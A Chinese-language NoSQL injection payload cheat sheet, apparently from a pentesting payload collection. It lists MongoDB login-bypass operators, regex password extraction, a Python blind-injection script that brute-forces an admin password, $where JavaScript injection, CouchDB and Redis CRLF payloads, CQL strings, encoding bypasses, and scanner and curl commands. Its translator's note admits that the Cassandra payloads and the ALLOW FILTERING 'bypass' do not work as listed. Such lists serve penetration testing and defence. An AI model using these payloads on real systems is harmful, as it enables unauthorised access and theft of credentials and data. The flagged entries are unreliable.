<a id="-nosql-injection-payloads"></a>
# 🍃 NoSQL 注入载荷

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](./NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-mongodb-injection"></a>
## 🎯 MongoDB 注入

<a id="authentication-bypass"></a>
### 身份验证绕过
```javascript
// JSON 注入
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL 编码
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

<a id="common-operators"></a>
### 常用运算符
```javascript
$eq     // 等于
$ne     // 不等于
$gt     // 大于
$gte    // 大于或等于
$lt     // 小于
$lte    // 小于或等于
$in     // 在数组中
$nin    // 不在数组中
$regex  // 正则表达式
$exists // 字段存在
$or     // 逻辑或
$and    // 逻辑与
$where  // JavaScript 表达式
```

---

<a id="-basic-payloads"></a>
## 💉 基本载荷

<a id="url-parameter-injection"></a>
### URL 参数注入
```
# 身份验证绕过
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# 恒真条件
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

<a id="json-body-injection"></a>
### JSON 请求体注入
```json
// 基本绕过
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// 正则表达式绕过
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// 逻辑或条件
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// 大于
{"username": "admin", "password": {"$gt": ""}}
```

---

<a id="-data-extraction"></a>
## 🔥 数据提取

<a id="regex-based-extraction"></a>
### 基于正则表达式的数据提取
```javascript
// 逐字符提取密码
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// 按位置提取
password[$regex]=^.{0}a.*   // 第一个字符是 'a'？
password[$regex]=^.{1}b.*   // 第二个字符是 'b'？

// 常见字符
password[$regex]=^[a-z].*   // 以小写字母开头
password[$regex]=^[A-Z].*   // 以大写字母开头
password[$regex]=^[0-9].*   // 以数字开头
```

<a id="blind-boolean-extraction-script"></a>
### 布尔盲注提取脚本
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

<a id="-advanced-payloads"></a>
## 🚀 进阶载荷

<a id="where-javascript-injection"></a>
### $where JavaScript 注入
```javascript
// 基于延时（时间盲注）
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// 数据提取
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// 基于错误
{"$where": "this.constructor.constructor('return this.password')()"}
```

<a id="array-injection"></a>
### 数组注入
```json
// $in 运算符
{"username": {"$in": ["admin", "administrator", "root"]}}

// $nin 运算符
{"username": {"$nin": ["guest", "anonymous"]}}
```

<a id="operator-injection"></a>
### 运算符注入
```
# 将字段转为运算符
username=admin&password[$ne]=wrongpassword

# 嵌套运算符
username[$eq]=admin&password[$regex]=^p

# 多个运算符
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

<a id="-couchdb-injection"></a>
## 🍃 CouchDB 注入

<a id="basic-payloads"></a>
### 基本载荷
```javascript
// 身份验证绕过
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// 正则表达式
{"selector": {"username": {"$regex": ".*"}}}

// 大于
{"selector": {"password": {"$gt": null}}}
```

<a id="view-injection"></a>
### 视图注入
```javascript
// Mango 查询注入
{"selector": {"_id": {"$gt": null}}}

// 获取所有文档
{"selector": {"_id": {"$regex": ".*"}}}
```

---

<a id="-redis-injection"></a>
## 🔴 Redis 注入

<a id="basic-commands"></a>
### 基本命令
```redis
# 键枚举
KEYS *
SCAN 0

# 数据提取
GET key_name
HGETALL hash_name

# 设置数据
SET key value
HSET hash field value
```

<a id="command-injection-via-app"></a>
### 通过应用进行命令注入
```
# 用户输入被传入 Redis 命令的情况
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

<a id="-cassandra-injection"></a>
## 📊 Cassandra 注入

<a id="cql-injection"></a>
### CQL 注入
```sql
-- 基本注入
' OR '1'='1
' OR ''='

-- ALLOW FILTERING 绕过（局限见译注）
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- 注释注入
admin'--
admin'/*
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技巧

<a id="url-encoding"></a>
### URL 编码
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

<a id="unicode-bypass"></a>
### Unicode 绕过
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

<a id="array-syntax-variations"></a>
### 数组语法变体
```
# 标准形式
password[$ne]=

# 替代形式
password[0][$ne]=
password[][$ne]=
```

<a id="content-type-manipulation"></a>
### Content-Type 变换
```
# 从表单改为 JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

<a id="-injection-points"></a>
## 📝 注入点

```
POST /login
- 请求体参数（JSON／表单）
- 查询字符串参数

GET /users?id=
- 查询参数

请求头：
- Authorization
- Cookie 值

API 端点：
- 后端使用 MongoDB 的 GraphQL
- REST API 过滤条件
```

---

<a id="-detection-checklist"></a>
## 🔍 检测清单

```markdown
□ 测试 $ne 运算符：{"field": {"$ne": ""}}
□ 测试 $gt 运算符：{"field": {"$gt": ""}}
□ 测试 $regex：{"field": {"$regex": ".*"}}
□ 测试 $where：{"$where": "1==1"}
□ 测试 URL 数组语法：field[$ne]=
□ 测试 JSON 运算符
□ 检查响应时间是否不同
□ 检查响应长度是否不同
□ 使用不同内容类型测试
```

---

<a id="-tools"></a>
## 🔗 工具

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# MongoDB 注入扫描器
nuclei -t nosql-injection.yaml -u http://target

# 使用 curl 手动测试
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

<a id="-related-payloads"></a>
## 🔗 相关载荷

- [SQL 注入载荷](./SQLi.zh-CN.md)
- [GraphQL 注入](./GraphQL-Injection.zh-CN.md)

---

**返回载荷目录：** 原文所指的载荷索引不可用（`./README.md`）；本目录没有英文 README，故未创建翻译索引。

> 译注：[Cassandra CQL 文档](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html)中的 WHERE 关系以 AND 连接；本页沿用 SQL 风格的 OR 载荷不能直接作为有效 CQL。ALLOW FILTERING 控制查询过滤，不会绕过身份验证。正则盲注脚本没有转义候选字符，遇到正则元字符可能误判；示例保持原样。JSON 块中的 // 注释仅用于讲解，标准 JSON 请求不接受注释。
